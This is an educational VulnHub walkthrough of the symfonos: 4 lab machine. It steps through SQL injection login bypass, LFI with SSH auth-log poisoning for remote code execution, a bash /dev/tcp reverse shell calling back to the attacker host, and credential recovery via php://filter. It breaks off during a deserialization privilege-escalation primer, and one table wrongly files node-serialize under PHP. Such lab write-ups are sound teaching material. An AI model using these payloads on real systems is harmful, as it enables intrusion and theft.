# symfonos: 4 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | symfonos: 4 |
| **Difficulty** | Intermediate (OSCP‑like; teaches "trying harder") |
| **Author** | Zayotic |
| **Released** | 20 August 2019 |
| **VulnHub Entry** | <https://vulnhub.com/entry/symfonos-4,347/> |
| **Download** | <https://vulnhub.com/entry/symfonos-4,347/#download> |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux — Debian 10 (OpenSSH 7.9p1, Apache httpd 2.4.38) |

> **Note:** VMware and VirtualBox builds can vary slightly ("varies by build"). The
> directory names, the leaked database password and the local web app port may differ
> between rebuilds, but the intended chain below is stable.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to **brute-force hidden files** with `ffuf`, then how to turn a directory's own
  contents into a **better wordlist**.
- How a redirect plus a **login form** can be bypassed with **SQL injection**
  (`admin' or 1=1-- -`) *and* with a weak **session check**.
- What **Local File Inclusion (LFI)** is, and that if the app appends `.log`, you can
  still read **log files** — including SSH authentication logs.
- **Log poisoning** of `/var/log/auth.log` to get **Remote Code Execution (RCE)** as
  `www-data`.
- How to **read source code that leaks passwords** (a hard-coded database credential
  that is also a user's password).
- What **insecure deserialization** of a cookie is, and how a Python app using
  **`jsonpickle`/pickle** running as root can be exploited to escalate privileges.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). Kali must be on the same host-only/NAT
network as the target.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP on the lab network. It uses DHCP, so the IP may
> change on every import.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan -l
```

```text
Interface: eth0, type: EN10MB, MAC: ...
Starting arp-scan 1.9.7 with 256 hosts
192.168.56.1      0a:00:27:00:00:00   Cadmus Computer Systems
192.168.56.101    08:00:27:12:34:56   PCS Systemtechnik GmbH
```

> **How to read it:** `arp-scan` and `netdiscover` both list live hosts. The `.1`
> address is the host/gateway; `192.168.56.101` is our target.

**Target IP:** `192.168.56.101`

![Finding the target](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Port scan


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
sudo nmap -sC -sV -p 22,80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **How to read it:** a tiny attack surface — a web server and SSH. There is no
> "easy" service here; we must extract everything from the web app and reuse
> credentials we find on the filesystem.

![Nmap scan output](images/02-nmap.png)

### 2.2 Web — the page is only an image

Browsing to `http://192.168.56.101/` shows a single image and nothing else. Time to
brute-force.


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)
> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)

```bash
ffuf -ic -c -u http://192.168.56.101/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -e / -fc 403 | tee root.ffuf
```

```text
gods                    [Status: 301, Size: 316]
```

> **Why it works:** `ffuf` replaces `FUZZ` with each wordlist entry and reports
> everything that is not a `403`. We found `http://192.168.56.101/gods/`.

```bash
curl -s http://192.168.56.101/gods/
```

```text
<a href="hades.log">hades.log</a>
<a href="poseidon.log">poseidon.log</a>
<a href="medusa.log">medusa.log</a>
```

Each log file contains a **single word** inside. Read them:


> ### 📖 Concept — What is Hydra doing?
>
> **Hydra** is a network login brute-forcer. It speaks the login protocol of ~50
> services (SSH, FTP, HTTP, MySQL, SMB, RDP, VNC, SNMP…) and tries credential
> combinations until one is accepted. There is no exploit and no cleverness — it is a
> very fast, very patient guesser.
>
> | Flag | Meaning |
> | --- | --- |
> | `-l USER` / `-L file` | single **l**ogin name / a *file* of them |
> | `-p PASS` / `-P file` | single **p**assword / a *file* of them |
> | `-C file` | a file of colon-separated `user:pass` **pairs** (credential stuffing) |
> | **`-e nsr`** | also try **n**ull password, **s**ame-as-username, and **r**eversed username |
> | `-f` | stop at the first success |
> | `-t N` | threads — higher is faster, noisier, and can destabilise a lab VM |
> | `-I` | ignore a stale `hydra.restore` file |
> | `ssh://` | the **service module** — picking the wrong one is the most common Hydra mistake |
>
> **`-e nsr` should be on every run.** The three cheapest guesses in existence are
> empty, the username, and the reversed username — and they succeed astonishingly
> often, usually in under a second, before the wordlist is even consulted.
>
> **A wordlist attack is not a brute force.** Different attacks, different costs:
>
> | Attack | Tries | Notes |
> | --- | --- | --- |
> | **Wordlist** | curated list, many passwords → **one** account | Fast, high hit rate |
> | **Brute force** | every character combination | Astronomically slow |
> | **Password spraying** | **one** password → **many** accounts | Stays under per-account lockout thresholds |
> | **Credential stuffing** | real leaked `user:pass` pairs | Exploits reuse |
>
> > ⚠️ Pointing Hydra at all 14 million lines of `rockyou.txt` over SSH would take
> > days and generate millions of failed logins in `auth.log`. Fine on a VM you own;
> > on a real system it is an obvious, logged event. Professionals throttle with
> > `-t 4`, use a short targeted list, and spray rather than hammer.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§7.4 — Recognising the shape of the tool call](../../docs/CONCEPTS.md#74-recognising-the-shape-of-the-tool-call)

```bash
for f in hades poseidon medusa; do echo "== $f =="; curl -s http://192.168.56.101/gods/$f.log; echo; done
```

```text
== hades ==
cerberus
== poseidon ==
atlantis
== medusa ==
gorgon
```

> **Why it works:** a directory full of short "log" files is a hidden **wordlist**.
> Take every word you find and reuse it — this is the enumeration trick the box wants
> you to learn.

### 2.3 Turn the contents into a wordlist and brute-force again

Put the harvested words into a file and use them as candidate **file names** (adding a
`.php` extension):

```bash
printf 'cerberus\natlantis\ngorgon\nhades\nposeidon\nmedusa\nsea\n' > words.txt
ffuf -ic -c -u http://192.168.56.101/FUZZ.php -w words.txt
```

```text
sea                     [Status: 302, Size: 0]
```

We discovered `http://192.168.56.101/sea.php`. Visiting it **redirects** us to
`atlantis.php`, which presents a **login form**.

> **Why it works:** the harvested words `.php` files. `sea.php` returns a `302`
> redirect to the login page — a hint that `sea.php` is the interesting "post-login"
> page and `atlantis.php` is the gate in front of it.

![Directory and file enumeration](images/03-enum.png)

---

## 3. Foothold

### 3.1 Bypass the login

Visit `http://192.168.56.101/atlantis.php`. Try to **log in with a SQL injection**:


> ### 📖 Concept — What is SQL injection?
>
> The application builds a query by **concatenating your input**:
>
> ```php
> $q = "SELECT * FROM users WHERE user='".$_POST['u']."' AND pass='".$_POST['p']."'";
> ```
>
> Supply `admin' -- ` and it becomes:
>
> ```sql
> SELECT * FROM users WHERE user='admin' -- ' AND pass='whatever'
> ```
>
> `-- ` starts a SQL comment (**the trailing space is required in MySQL**), so the
> password check is deleted and you are logged in as admin with no password. Your
> input escaped the *data* context and became *code*.
>
> **Detect it** by inserting `'`, `"`, `` ` ``, `)` or `--` and watching for a database
> error, a changed page length, or a different status code.
>
> **Payload shapes:**
>
> ```text
> ' OR 1=1 --                        tautology
> ' OR '1'='1                        string-context tautology
> 1' UNION SELECT 1,2,3 --           find the column count, then extract data
> 1' UNION SELECT user_login,user_pass,3 FROM wp_users --
> '; WAITFOR DELAY '0:0:5' --        blind/time-based confirmation
> ```
>
> ```bash
> sqlmap -u "http://target/page.php?id=1" --dbs
> sqlmap -u "http://target/page.php?id=1" -D wordpress -T wp_users --dump
> sqlmap -r request.txt --batch --level 3 --risk 2      # from a saved Burp request
> ```
>
> > **`sqlmap` is a tool, not a substitute for understanding.** When it fails the
> > reason is usually that you have not told it *where* the injectable parameter is,
> > that authentication is needed (`--cookie=`), or that the injection is
> > second-order. Confirm manually with a `'` first — it takes ten seconds and tells
> > you whether sqlmap has anything to work with.
>
> The fix is always the same: **prepared statements / bound parameters**, never string
> concatenation.
>
> **Deep dive:** [CONCEPTS §13.1 — SQL injection](../../docs/CONCEPTS.md#131-sql-injection-sqli)

```text
Username: admin' or 1=1-- -
Password: whatever
```

```text
302 Found -> Location: sea.php
```

> **Why it works:** the login query is roughly
> `SELECT ... WHERE user='$u' AND pass='$p'`. Our username closes the quote and makes
> the condition `1=1`, so the query returns a row and we "authenticate". The `-- -`
> comments out the rest. This is a **blind boolean SQL injection** — `admin' and
> 1=2-- -` is rejected, which proves the injection point. You can automate the dump
> with `sqlmap -r atlantis.req --batch`.

**A second, even simpler bypass:** the page after login only checks
`isset($_SESSION['logged_in'])`, **not its value**. Submitting *any* wrong credentials
still sets the session, so if you then request `sea.php` directly you are let in.

### 3.2 Exploit the LFI in `sea.php`

`sea.php` has a dropdown that loads a "god" file and displays its log. The URL looks
like:

```text
http://192.168.56.101/sea.php?g=hades
```

The app appends `.log` to our input and reads the file, so it *seems* limited to
`/gods`. But we can still reach **any `.log`-suffixed file on disk**:

```text
http://192.168.56.101/sea.php?g=../../../../var/log/auth
```

> **Why it works:** this is a **Local File Inclusion** / directory traversal. `../`
> climbs out of the web root. Because the app appends `.log`, we target files whose
> name ends in `.log` — and `sshd` writes **`/var/log/auth.log`**, which is perfect for
> poisoning. **Note:** the exact parameter name (`g`, `god`, `url`) varies by build.

![Local File Inclusion](images/04-lfi.png)

### 3.3 Poison the SSH log → RCE

Every failed SSH login records the **username** in `auth.log`. Put PHP in the
username:

```bash
ssh '<?php system($_GET["c"]); ?>'@192.168.56.101 -o PreferredAuthentications=password
```

This fails, but the string `<?php system($_GET["c"]); ?>` is now written into
`/var/log/auth.log`. Include the log through the LFI and pass a command:

```text
http://192.168.56.101/sea.php?g=../../../../var/log/auth&c=id
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** the LFI reads `auth.log`, PHP parses and **executes** the code we
> injected into it, and `system($_GET['c'])` runs our command as the web user.
> **LFI + log poisoning = RCE.**

### 3.4 Get a reverse shell


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
nc -lvnp 4444
```

Then request the log with a command that calls back (URL-encode as needed):

```text
http://192.168.56.101/sea.php?g=../../../../var/log/auth&c=bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'
```

```text
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrade to a full TTY:


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then:  stty raw -echo; fg   and:  export TERM=xterm
```

### 3.5 Read the leaked credential and pivot

Read `atlantis.php` through the LFI using the PHP filter (so it is not executed):


> ### 📖 Concept — What is Local File Inclusion?
>
> **LFI** happens when a script passes a user-controlled path to `include()`,
> `require()` or a file-read function without validating it:
>
> ```php
> <?php include($_GET['page']); ?>     // you control a filesystem path
> ```
>
> Now you can read anything the web-server user can read:
>
> ```text
> ?page=/etc/passwd
> ?page=../../../../etc/passwd
> ?page=/var/log/apache2/access.log        # log poisoning
> ?page=/proc/self/environ
> ?page=/var/lib/php/sessions/sess_<your PHPSESSID>
> ```
>
> **The wrapper to memorise is `php://filter`** — it returns the file **base64-encoded
> instead of executing it**, so you can read PHP *source*:
>
> ```text
> ?page=php://filter/convert.base64-encode/resource=index.php
> ```
>
> That is how you recover `wp-config.php`, `configuration.php`, `.env` and
> `config/database.php` — i.e. the database credentials.
>
> **LFI alone only reads.** To get code execution you must make the target *write* a
> file you control somewhere predictable, then include it. The usual primitives: an
> **NFS export**, session files, **log poisoning** (inject PHP through a crafted
> `User-Agent`, then include the access log), or `/proc/self/environ`.
>
> **RFI** (`?page=http://attacker/shell.txt`) is the remote version and requires
> `allow_url_include=1` in `php.ini` — off by default since PHP 5.2. When it fails the
> error usually says `http:// wrapper is disabled`, which tells you to switch to LFI
> plus a local write.
>
> **Deep dive:** [CONCEPTS §13.2 — LFI](../../docs/CONCEPTS.md#132-local-file-inclusion-lfi) ·
> [§13.3 — RFI](../../docs/CONCEPTS.md#133-remote-file-inclusion-rfi)

```text
http://192.168.56.101/sea.php?g=php://filter/convert.base64-encode/resource=../atlantis
```

```text
PD9waHAg...   (base64 — decode it)
```


> ### 📖 Concept — Encoding is not encryption
>
> These three get conflated constantly, and the confusion costs hours:
>
> | | **Encoding** | **Hashing** | **Encryption** |
> | --- | --- | --- | --- |
> | Purpose | Represent data in another *format* | Prove integrity / store passwords | Provide *confidentiality* |
> | Reversible? | **Yes — trivially, with no key** | **No** (only guessable) | Yes, **with the key** |
> | Key needed? | No | No | **Yes** |
> | Examples | base64, hex, URL-encoding, ROT13, binary | MD5, SHA-256, bcrypt, phpass | AES, RSA, ChaCha20 |
> | Security value | **Zero** | Depends on the algorithm | Depends on the key |
>
> **Recognise base64 on sight.** Three reliable tells: the character set is only
> `A–Z a–z 0–9 + /` with optional `=` padding; **the length is a multiple of 4**; and
> it is not a fixed-length digest with a `$1$`/`$6$`/`$P$` prefix.
>
> ```bash
> echo 'YWFydGk6YWFydGlAZ21haWwuY29t' | base64 -d; echo
> # aarti:aarti@gmail.com
> ```
>
> > **Base64 is not a secret.** It exists so binary data survives text-only transport
> > — email attachments, HTTP headers, JSON. Seeing it "protecting" a password is a
> > *finding*, not a defence. **Always check whether it is nested:** decode, then test
> > whether the result is itself base64 or hex. Some boxes chain two or three layers.
>
> **Identify hashes by prefix:** 32 hex = MD5 · 40 hex = SHA-1 · 64 hex = SHA-256 ·
> `$1$` = MD5-crypt · `$2b$` = bcrypt · `$6$` = SHA-512-crypt · `$y$` = yescrypt ·
> **`$P$`/`$H$` = phpass (WordPress, Drupal)** · `$apr1$` = Apache `.htpasswd` ·
> `pbkdf2_sha256$` = Django.
>
> **Deep dive:** [CONCEPTS §10 — Encoding vs hashing vs encryption](../../docs/CONCEPTS.md#10-encoding-vs-hashing-vs-encryption)

```bash
echo 'PD9waHAg...' | base64 -d
```

```php
$db_user = "root";
$db_pass = "yVdPT0VBWHU0T0FRTnBW";
```

> **Why it works:** the `php://filter/convert.base64-encode` wrapper returns the file
> **as text** (base64) instead of running it, so we can read the source and its
> hard-coded credential. That same password is reused for the local user
> **`poseidon`**.

```bash
ssh poseidon@192.168.56.101
# password: yVdPT0VBWHU0T0FRTnBW
```

![Shell and leaked credentials](images/05-foothold.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

### 4.1 Find a service running as root

Check what is listening **only on localhost**:


> ### 📖 Concept — Why you re-scan from the inside
>
> ```bash
> ss -tulnp
> ```
>
> `-t` TCP · `-u` UDP · `-l` listening · `-n` numeric (skip DNS — much faster) · `-p`
> show the owning process. (`netstat -antup` is the older equivalent.)
>
> **This is the post-exploitation version of `nmap -p-`, and it finds things nmap
> structurally cannot.** A service bound to `127.0.0.1` is invisible to an external
> scan — nmap connects to the target's *outside* address, and the daemon is not
> listening there. From inside, you see all of it.
>
> Loopback-only services are frequently the most vulnerable thing on the box: an
> unauthenticated **Redis** on 6379, a **MySQL** with an empty root password, a
> **MongoDB** with no auth, a debug console, an admin API. Look for lines like:
>
> ```text
> tcp LISTEN 0 128  127.0.0.1:3306  0.0.0.0:*  users:(("mysqld",pid=889,fd=22))
> ```
>
> Also enumerate outward, to find other hosts you can now reach:
>
> ```bash
> ip a; ip route; cat /etc/resolv.conf; arp -a; cat /etc/hosts
> ```
>
> **Deep dive:** [CONCEPTS §16.1 — Internal enumeration](../../docs/CONCEPTS.md#161-internal-enumeration)

```bash
ss -tlnp
```

```text
LISTEN  0  128  127.0.0.1:8080  0.0.0.0:*  users:(("python3",pid=...,fd=...))
```

Look at the process detail:

```bash
ps aux | grep -i python
```

```text
root  1234  python3 /opt/app/...  (listening on 8080)
```

> **Why it works:** a web app bound to `127.0.0.1` is not reachable from outside — but
> it *is* running as **root**. We need to reach it from our Kali session. Use an SSH
> tunnel (`ssh -L 8080:127.0.0.1:8080 poseidon@192.168.56.101`), or simply `curl` it
> from the target itself.

### 4.2 Read the application source

```bash
ls -l /opt
cat /opt/*/*.py 2>/dev/null
```


> ### 📖 Concept — Insecure deserialisation
>
> **Serialisation** converts an in-memory object into bytes or text so it can be
> stored or transmitted. **Deserialisation** is the reverse — and it is dangerous
> because reconstructing an object can *run code*.
>
> Most languages have **magic methods** that fire automatically on construction or
> destruction. If an attacker supplies the serialised object, they choose the class —
> and therefore choose which magic method runs, and with what properties.
>
> **Recognise the format by its signature:**
>
> | Ecosystem | Marker |
> | --- | --- |
> | PHP `serialize()` | `O:4:"User":2:{s:4:"name";s:5:"alice";}` |
> | **PHP `node-serialize`** | **`_$$ND_FUNC$$_`** — note the **doubled** `$$` |
> | Java native | `AC ED 00 05` in hex, or `rO0AB` in base64 |
> | Python pickle | `\x80\x04\x95`, or base64 starting `gASV` |
> | .NET | `AAEAAAD/////` |
> | Ruby Marshal | `\x04\x08` |
>
> **PHP is the easiest to reason about.** These methods run without you calling them:
> `__wakeup()` on unserialize, `__destruct()` when the object is destroyed,
> `__toString()` when it is echoed. A gadget chain strings them together so that
> deserialising your input ends in `system()`.
>
> ```php
> // The payload shape: an object whose destructor runs a command
> class X { function __destruct(){ system($this->cmd); } }
> $o = new X; $o->cmd = 'id';
> echo serialize($o);   // O:1:"X":1:{s:3:"cmd";s:2:"id";}
> ```
>
> **Where to look:** any base64 blob in a **cookie**, a `viewstate` field, a
> `remember_me` token, or a POST body that the server appears to *understand* without
> you having sent JSON. Decode it — if it starts `O:` or contains `$$ND_FUNC$$`, you
> have found the vulnerability.
>
> > The `node-serialize` marker is doubled (`_$$ND_FUNC$$_`) because the library uses
> > a JS template literal internally. **Blog posts often render it single-dollared
